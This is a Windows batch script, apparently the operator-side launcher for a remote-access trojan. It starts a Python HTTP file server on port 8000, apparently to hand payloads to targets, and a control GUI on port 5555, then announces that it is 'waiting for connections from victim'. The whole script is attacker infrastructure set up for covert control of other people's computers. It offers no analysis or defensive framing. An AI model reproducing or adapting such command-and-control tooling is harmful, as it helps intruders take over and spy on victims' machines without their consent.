@echo off
color 0A
cls
echo.
echo ================================================
echo   STARTING REMOTE CONTROL SERVERS
echo ================================================
echo.
echo Your IP: 172.28.1.78
echo Control Port: 5555
echo Web Server Port: 8000
echo.
echo ================================================
echo.

REM Get the directory where this bat file is located
set SCRIPT_DIR=%~dp0

REM Start web server in new window
echo [1/2] Starting Web Server (port 8000)...
start "Web Server - Port 8000" cmd /k "cd /d %SCRIPT_DIR% && python -m http.server 8000"
timeout /t 2 /nobreak >nul

REM Start control GUI
echo [2/2] Starting Control Server GUI...
echo.
echo ================================================
echo   SERVERS RUNNING
echo ================================================
echo.
echo Web Server: Running in separate window
echo Control GUI: Starting now...
echo.
echo Keep both windows open!
echo.
echo Waiting for connections from victim...
echo ================================================
echo.

python "%SCRIPT_DIR%server_professional.py"

REM If GUI closes, cleanup
echo.
echo Servers stopped.
pause
